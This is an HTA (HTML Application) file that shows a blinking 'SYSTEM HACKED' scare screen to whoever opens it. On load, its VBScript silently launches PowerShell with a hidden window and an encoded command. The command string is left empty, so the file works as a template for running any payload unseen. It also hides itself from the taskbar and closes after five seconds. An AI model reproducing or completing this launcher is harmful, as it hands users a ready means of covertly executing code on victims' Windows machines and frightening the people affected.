<html>
<head>
  <title>💀 SYSTEM BREACHED 💀</title>
  <hta:application 
    id="app"
    applicationname="SystemBreached"
    border="thin"
    caption="yes"
    maximizeButton="no"
    minimizeButton="no"
    showInTaskBar="no"
    windowState="normal"
    sysmenu="no"
    scroll="no"
  />
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim base64Command, shell, cmd
      base64Command = ""
      Set shell = CreateObject("WScript.Shell")
      cmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " & base64Command
      shell.Run cmd, 0, True
    End Sub
  </script>
  <script language="javascript">
    // Auto-close after 5 seconds
    setTimeout(function() {
      window.close();
    }, 5000);
  </script>
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: "Courier New", monospace;
      font-size: 22px;
      text-align: center;
      margin-top: 20%;
      animation: blink 1s steps(1) infinite;
    }
    @keyframes blink {
      50% { opacity: 0; }
    }
    h1 {
      font-size: 36px;
      color: red;
    }
    .glow {
      text-shadow: 0 0 5px lime, 0 0 10px lime, 0 0 20px lime;
    }
  </style>
</head>
<body>
  <h1 class="glow">⚠️ SYSTEM HACKED ⚠️</h1>
  <p class="glow">Everything is under my control now 😈</p>
  <p class="glow">Just kidding... or am I?</p>
  <p class="glow">Shutting down in 5 seconds 💣</p>
</body>
</html>
